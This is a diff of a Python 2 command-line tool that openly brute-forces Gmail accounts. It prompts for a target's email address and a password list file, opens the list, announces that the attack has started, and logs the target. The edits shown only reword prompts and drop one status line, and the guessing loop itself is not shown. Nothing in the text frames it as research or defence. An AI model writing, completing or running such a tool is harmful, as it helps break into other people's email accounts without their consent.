@@ -33,7 +33,7 @@ os.system("clear")
 print rpfp + bcolors.BOLD + '{ '+tick+'} ping (www.gmail.com)' + bcolors.OKBLUE +  ' ' # Pinging gmail alert
 time.sleep(0.25)
 print ' '
-print rpfp + '{ '+tick+'/ '+untick+'} Checking Gmail availability was started'  #checking availability notification
+print rpfp + '{ '+tick+'/ '+untick+'} Checking Gmail availability started'  #checking availability notification
 print ' '
 os.system("ping www.gmail.com -c 3")  #pinging gmail command 
 print ' '
@@ -50,15 +50,12 @@ user = raw_input( rpfp + "{ "+tick+"} Enter the Target's Email Address ==>  ") #
 print ' '
 print rpfp + bcolors.FAIL + "("+user +")" + " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Target's email succesfully selected ! ==> " + user + bcolors.ENDC + ' '     # target selected alert
 print '   '                      
-passwfile = raw_input( rpfp + bcolors.FAIL + "("+user + ")" + " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Enter the password file name ==>  ") #selecting password file
+passwfile = raw_input( rpfp + bcolors.FAIL + "("+user + ")" + " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Enter the password list file name ==>  ") #selecting password file
 print ' '
 print rpfp + bcolors.FAIL + "("+ user + ")" + " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Password File Succesfully Selected ! ==> " + passwfile + bcolors.ENDC + ' ' #passwordfile selected alert
 print " "
 time.sleep(0.25)
 passwfile = open(passwfile, "r")
-print rpfp + bcolors.FAIL + "("  + user + ")" + " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Brute Force Attack will start now !  " + bcolors.ENDC  + ' ' #bruteforce attack starting alert
-time.sleep(0.25)
-print ' '
 print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Attack Status: Started Now !!! " + bcolors.ENDC + ' '  #bruteforce attack started alert
 print ' '
 logfile.write (user) #open the logfile and write the user selected (target)
